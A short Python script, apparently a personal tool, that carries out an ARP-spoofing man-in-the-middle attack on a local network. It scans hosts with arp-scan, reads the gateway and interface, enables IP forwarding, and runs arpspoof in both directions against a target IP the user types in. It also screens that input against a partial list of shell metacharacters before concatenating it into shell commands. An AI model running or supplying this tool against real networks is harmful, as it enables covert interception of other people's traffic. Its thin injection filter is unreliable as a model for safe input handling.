from subprocess import run
from datetime import datetime

def mainFunc():

	scanHOST = run("timeout --signal=SIGKILL 5s arp-scan --localnet", 
		shell = True, capture_output = True, text = True)

	if scanHOST.returncode == 0:
		print(scanHOST.stdout)

	else:
		print(scanHOST.stderr)

	defaultGATEWAY = run("timeout --signal=SIGKILL 2s ip route", 
		shell = True, capture_output = True, text = True)

	GATEWAY_ = defaultGATEWAY.stdout.split(" ")[2]
	INTERFACE_ = defaultGATEWAY.stdout.split(" ")[4]

	malicious_pattern = [';', '&', '&&', '|', '$', '-', '(', ')']

	TARGET_ = str(input("IP address -->"))
	conv = list(TARGET_)

	for detection in range(len(TARGET_)):
		if conv[detection] in malicious_pattern:
			print("Was Detected Malicious symbol", conv[detection])
			raise SystemExit
		else:
			pass

	try:
		if str(open("/proc/sys/net/ipv4/ip_forward", 'r').read()) == '0':
			open("/proc/sys/net/ipv4/ip_forward", 'w').write("1")
		else:
			pass

	except PermissionError:
		print("Permission Denied!")

		raise SystemExit

	run("arpspoof -i "+INTERFACE_+" -t "+GATEWAY_+" "+TARGET_+" 2> /dev/null 1> /dev/null &", 
		shell = True, capture_output = False, text = True)

	run("arpspoof -i "+INTERFACE_+" -t "+TARGET_+" "+GATEWAY_+" 2> /dev/null 1> /dev/null &", 
		shell = True, capture_output = False, text = True)

mainFunc()
